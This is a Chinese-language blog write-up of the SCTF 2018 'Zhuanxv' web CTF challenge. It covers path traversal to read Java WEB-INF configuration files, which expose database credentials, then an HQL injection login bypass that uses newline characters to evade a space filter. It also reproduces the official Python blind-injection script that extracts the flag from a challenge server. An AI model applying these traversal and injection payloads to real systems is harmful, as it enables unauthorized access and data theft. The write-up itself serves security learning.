    <title>XCTF 4th-SCTF-2018-Web-Zhuanxv</title>
    <url>/2022/04/18/XCTF-4th-SCTF-2018-Web-Zhuanxv/</url>
    <content><![CDATA[<h1 id="Zhuanxv"><a href="#Zhuanxv" class="headerlink" title="Zhuanxv"></a>Zhuanxv</h1><span id="more"></span>

<p> 题目描述：你只是在扫描目标端口的时候发现了一个开放的web服务 </p>
<p>1.使用dirsearch进行目录扫描，得到&#x2F;list后台登陆界面，尝试登陆&#x2F;sql注入无果</p>
<p>2.抓包尝试访问一下 &#x2F; 以及&#x2F;list ,在&#x2F; 下发现<img src="/../images/1649936878497.png" alt="1649936878497"></p>
<p>出现jsessionid，说明是java开发的网页。</p>
<p>3.burp抓包发现当访问&#x2F;list目录时，会先加载一个图片文件。</p>
<p><img src="/../images/1649936821330.png" alt="1649936821330"></p>
<p>访问之后是下载得到一个图片。</p>
<p>4.尝试对fileName参数进行任意文件读取，输入..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd无果。根据以上发现的此网页是基于java开发的，尝试访问..&#x2F;..&#x2F;WEB-INF&#x2F;web.xml，成功下载到此文件。</p>
<p>内容：<img src="/../images/1649937312485.png" alt="1649937312485"></p>
<p>打开配置文件，发现Struts2，<strong>Struts2在WEB-INF目录的class目录下有个核心的xml文件</strong> 叫struts.xml</p>
<p>5.访问fileName&#x3D;..&#x2F;..&#x2F;WEB-INF&#x2F;classes&#x2F;struts.xml,成功下载</p>
<p>内容：<img src="/../images/1649937416411.png" alt="1649937416411"></p>
<p>好，发现几个拦截器类的路径， 访问..&#x2F;..&#x2F;WEB-INF&#x2F;classes&#x2F;applicationContext.xml，获取class文件路径和项目配置信息、数据库信息 </p>
<p>内容如下</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="line">&lt;beans xmlns=<span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span></span><br><span class="line">       xmlns:xsi=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><br><span class="line">       xsi:schemaLocation=<span class="string">&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span>&gt;</span><br><span class="line">    &lt;bean id=<span class="string">&quot;dataSource&quot;</span> class=<span class="string">&quot;org.springframework.jdbc.datasource.DriverManagerDataSource&quot;</span>&gt;</span><br><span class="line">        &lt;property name=<span class="string">&quot;driverClassName&quot;</span>&gt;</span><br><span class="line">            &lt;value&gt;com.mysql.jdbc.Driver&lt;/value&gt;</span><br><span class="line">        &lt;/property&gt;</span><br><span class="line">        &lt;property name=<span class="string">&quot;url&quot;</span>&gt;</span><br><span class="line">            &lt;value&gt;jdbc:mysql:<span class="comment">//localhost:3306/sctf&lt;/value&gt;</span></span><br><span class="line">        &lt;/property&gt;</span><br><span class="line">        &lt;property name=<span class="string">&quot;username&quot;</span> value=<span class="string">&quot;root&quot;</span>/&gt;</span><br><span class="line">        &lt;property name=<span class="string">&quot;password&quot;</span> value=<span class="string">&quot;root&quot;</span> /&gt;</span><br><span class="line">    &lt;/bean&gt;</span><br><span class="line">    &lt;bean id=<span class="string">&quot;sessionFactory&quot;</span> class=<span class="string">&quot;org.springframework.orm.hibernate3.LocalSessionFactoryBean&quot;</span>&gt;</span><br><span class="line">        &lt;property name=<span class="string">&quot;dataSource&quot;</span>&gt;</span><br><span class="line">            &lt;ref bean=<span class="string">&quot;dataSource&quot;</span>/&gt;</span><br><span class="line">        &lt;/property&gt;</span><br><span class="line">        &lt;property name=<span class="string">&quot;mappingLocations&quot;</span>&gt;</span><br><span class="line">            &lt;value&gt;user.hbm.xml&lt;/value&gt;</span><br><span class="line">        &lt;/property&gt;</span><br><span class="line">        &lt;property name=<span class="string">&quot;hibernateProperties&quot;</span>&gt;</span><br><span class="line">            &lt;props&gt;</span><br><span class="line">                &lt;prop key=<span class="string">&quot;hibernate.dialect&quot;</span>&gt;org.hibernate.dialect.MySQLDialect&lt;/prop&gt;</span><br><span class="line">                &lt;prop key=<span class="string">&quot;hibernate.show_sql&quot;</span>&gt;<span class="literal">true</span>&lt;/prop&gt;</span><br><span class="line">            &lt;/props&gt;</span><br><span class="line">        &lt;/property&gt;</span><br><span class="line">    &lt;/bean&gt;</span><br><span class="line">    &lt;bean id=<span class="string">&quot;hibernateTemplate&quot;</span> class=<span class="string">&quot;org.springframework.orm.hibernate3.HibernateTemplate&quot;</span>&gt;</span><br><span class="line">        &lt;property name=<span class="string">&quot;sessionFactory&quot;</span>&gt;</span><br><span class="line">            &lt;ref bean=<span class="string">&quot;sessionFactory&quot;</span>/&gt;</span><br><span class="line">        &lt;/property&gt;</span><br><span class="line">    &lt;/bean&gt;</span><br><span class="line">    &lt;bean id=<span class="string">&quot;transactionManager&quot;</span> class=<span class="string">&quot;org.springframework.orm.hibernate3.HibernateTransactionManager&quot;</span>&gt;</span><br><span class="line">        &lt;property name=<span class="string">&quot;sessionFactory&quot;</span>&gt;</span><br><span class="line">            &lt;ref bean=<span class="string">&quot;sessionFactory&quot;</span>/&gt;</span><br><span class="line">        &lt;/property&gt;</span><br><span class="line">    &lt;/bean&gt;</span><br><span class="line">    &lt;bean id=<span class="string">&quot;service&quot;</span> class=<span class="string">&quot;org.springframework.transaction.interceptor.TransactionProxyFactoryBean&quot;</span> <span class="keyword">abstract</span>=<span class="string">&quot;true&quot;</span>&gt;</span><br><span class="line">        &lt;property name=<span class="string">&quot;transactionManager&quot;</span>&gt;</span><br><span class="line">            &lt;ref bean=<span class="string">&quot;transactionManager&quot;</span>/&gt;</span><br><span class="line">        &lt;/property&gt;</span><br><span class="line">        &lt;property name=<span class="string">&quot;transactionAttributes&quot;</span>&gt;</span><br><span class="line">            &lt;props&gt;</span><br><span class="line">                &lt;prop key=<span class="string">&quot;add&quot;</span>&gt;PROPAGATION_REQUIRED&lt;/prop&gt;</span><br><span class="line">                &lt;prop key=<span class="string">&quot;find*&quot;</span>&gt;PROPAGATION_REQUIRED,readOnly&lt;/prop&gt;</span><br><span class="line">            &lt;/props&gt;</span><br><span class="line">        &lt;/property&gt;</span><br><span class="line">    &lt;/bean&gt;</span><br><span class="line">    &lt;bean id=<span class="string">&quot;userDAO&quot;</span> class=<span class="string">&quot;com.cuitctf.dao.impl.UserDaoImpl&quot;</span>&gt;</span><br><span class="line">        &lt;property name=<span class="string">&quot;hibernateTemplate&quot;</span>&gt;</span><br><span class="line">            &lt;ref bean=<span class="string">&quot;hibernateTemplate&quot;</span>/&gt;</span><br><span class="line">        &lt;/property&gt;</span><br><span class="line">    &lt;/bean&gt;</span><br><span class="line">    &lt;bean id=<span class="string">&quot;userService&quot;</span> class=<span class="string">&quot;com.cuitctf.service.impl.UserServiceImpl&quot;</span>&gt;</span><br><span class="line">        &lt;property name=<span class="string">&quot;userDao&quot;</span>&gt;</span><br><span class="line">            &lt;ref bean=<span class="string">&quot;userDAO&quot;</span>/&gt;</span><br><span class="line">        &lt;/property&gt;</span><br><span class="line">    &lt;/bean&gt;</span><br><span class="line">&lt;/beans&gt;</span><br></pre></td></tr></table></figure>

<p>这里暴露了数据库的端口用户名密码，尝试远程连接数据库，失败。</p>
<p>我们发现这里还有一个user.hbm.xml以及很多class类名，那我们继续下载查看</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">loadimage?fileName=../../WEB-INF/classes/user.hbm.xml</span><br><span class="line">loadimage?fileName=../../WEB-INF/classes/com/cuitctf/service/impl/UserServiceImpl.<span class="keyword">class</span></span><br><span class="line"><span class="title class_">loadimage</span>?fileName=../../WEB-INF/classes/com/cuitctf/dao/impl/UserDaoImpl.class</span><br></pre></td></tr></table></figure>

<p> 从UserServiceImpl.class里，我们可以看到，系统对用户名进行了过滤，过滤了空格和等号。 </p>
<p><img src="/../images/1650295153430.png" alt="1650295153430"></p>
<p> 从UserDaoImpl.class里，我们可以看到查询语句，这里使用的sql语句与mysql不太一样，使用的是HSQL。 </p>
<p>可以尝试构造万能密码</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> <span class="keyword">User</span> <span class="keyword">where</span> name <span class="operator">=</span><span class="string">&#x27;admin&#x27;</span> <span class="keyword">or</span> <span class="string">&#x27;1&#x27;</span><span class="operator">&gt;</span><span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> name <span class="keyword">like</span> <span class="string">&#x27;admin&#x27;</span> <span class="keyword">and</span> password <span class="operator">=</span> <span class="string">&#x27;&quot; + password + &quot;&#x27;</span></span><br></pre></td></tr></table></figure>

<p> 黄色部分就是拼接的语句，由于这里过滤了空格，可以考虑用换行符%0A替代空格绕过过滤 </p>
<p>payload：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">用户名：admin<span class="string">&#x27;%0Aor%0A&#x27;</span><span class="number">1</span><span class="string">&#x27;&gt;&#x27;</span><span class="number">0</span><span class="string">&#x27;%0Aor%0Aname%0Alike%0A&#x27;</span>admin</span><br><span class="line">密码：<span class="number">123</span>（随意）</span><br></pre></td></tr></table></figure>

<p>登录成功，然而并没有找到flag。</p>
<p> 再看一下之前下载的user.hbm.xml文件内容，发现了flag的映射类。 </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE hibernate-mapping PUBLIC</span><br><span class="line">        &quot;-//Hibernate/Hibernate Mapping DTD 3.0//EN&quot;</span><br><span class="line">        &quot;http://hibernate.sourceforge.net/hibernate-mapping-3.0.dtd&quot;&gt;</span><br><span class="line">&lt;hibernate-mapping package=&quot;com.cuitctf.po&quot;&gt;</span><br><span class="line">    &lt;class name=&quot;User&quot; table=&quot;hlj_members&quot;&gt;</span><br><span class="line">        &lt;id name=&quot;id&quot; column=&quot;user_id&quot;&gt;</span><br><span class="line">            &lt;generator class=&quot;identity&quot;/&gt;</span><br><span class="line">        &lt;/id&gt;</span><br><span class="line">        &lt;property name=&quot;name&quot;/&gt;</span><br><span class="line">        &lt;property name=&quot;password&quot;/&gt;</span><br><span class="line">    &lt;/class&gt;</span><br><span class="line">    &lt;class name=&quot;Flag&quot; table=&quot;bc3fa8be0db46a3610db3ca0ec794c0b&quot;&gt;</span><br><span class="line">        &lt;id name=&quot;flag&quot; column=&quot;welcometoourctf&quot;&gt;</span><br><span class="line">            &lt;generator class=&quot;identity&quot;/&gt;</span><br><span class="line">        &lt;/id&gt;</span><br><span class="line">        &lt;property name=&quot;flag&quot;/&gt;</span><br><span class="line">    &lt;/class&gt;</span><br><span class="line">&lt;/hibernate-mapping&gt;</span><br></pre></td></tr></table></figure>

<p>至此，我们知道，flag在数据库中。</p>
<p>由于万能密钥成功登录的原因是’1’&gt;’0’恒成立，我们可以在此处写payload构造盲注语句，爆破flag。</p>
<p>官方wp如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">s=requests.session()</span><br><span class="line"></span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    p=<span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">255</span>):</span><br><span class="line">  payload=<span class="string">&quot;(select%0Aascii(substr(id,&quot;</span>+<span class="built_in">str</span>(i)+<span class="string">&quot;,1))%0Afrom%0AFlag%0Awhere%0Aid&lt;2)&lt;&#x27;&quot;</span>+<span class="built_in">str</span>(j)+<span class="string">&quot;&#x27;&quot;</span></span><br><span class="line">        <span class="comment">#print payload</span></span><br><span class="line">        url=<span class="string">&quot;http://121.196.195.244:9032/zhuanxvlogin?user.name=admin&#x27;%0Aor%0A&quot;</span>+payload+<span class="string">&quot;%0Aor%0Aname%0Alike%0A&#x27;admin&amp;user.password=1&quot;</span></span><br><span class="line">        r1=s.get(url)</span><br><span class="line">        <span class="comment">#print url</span></span><br><span class="line">        <span class="comment">#print len(r1.text)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(r1.text)&gt;<span class="number">20000</span> <span class="keyword">and</span> p!=<span class="string">&#x27;&#x27;</span>:</span><br><span class="line">            flag+=p</span><br><span class="line">            <span class="built_in">print</span> i,flag</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        p=<span class="built_in">chr</span>(j)</span><br></pre></td></tr></table></figure>

<p>我对payload的理解：将payload带入后查询语句为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from User where name = &#x27; admin&#x27;%0aor%0a(select%0Aascii(substr(id,&quot;+str(i)+&quot;,1))%0Afrom%0AFlag%0Awhere%0Aid&lt;2)&lt;&#x27;num&#x27;%0Aor%0Aname%0Alike%0A&#x27;admin&#x27; and password = &#x27;1&#x27;</span><br></pre></td></tr></table></figure>

<p>这样不太清晰，urldecode一下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from User where name = &#x27; admin&#x27;</span><br><span class="line">or</span><br><span class="line">(select</span><br><span class="line">ascii(substr(id,&quot; str(i) &quot;,1))</span><br><span class="line">from</span><br><span class="line">Flag</span><br><span class="line">where</span><br><span class="line">id&lt;2)&lt;&#x27;str(j)&#x27;</span><br><span class="line">or</span><br><span class="line">name</span><br><span class="line">like</span><br><span class="line">&#x27;admin&#x27; and password = &#x27;1&#x27;</span><br><span class="line">#and的优先级高于or，所以实际查询语句应该是</span><br><span class="line">from User where name = &#x27; admin&#x27;</span><br><span class="line">or</span><br><span class="line">(select</span><br><span class="line">ascii(substr(id,&quot; str(i) &quot;,1))</span><br><span class="line">from</span><br><span class="line">Flag</span><br><span class="line">where</span><br><span class="line">id&lt;2)&lt;&#x27;str(j)&#x27;</span><br><span class="line">or</span><br><span class="line">(name</span><br><span class="line">like</span><br><span class="line">&#x27;admin&#x27; and password = &#x27;1&#x27;)</span><br><span class="line">#所以后面的name like 随便写一个符合语法的就行= =，至于where id &lt; 2，应该是想要选择特定的列数把</span><br></pre></td></tr></table></figure>

]]></content>
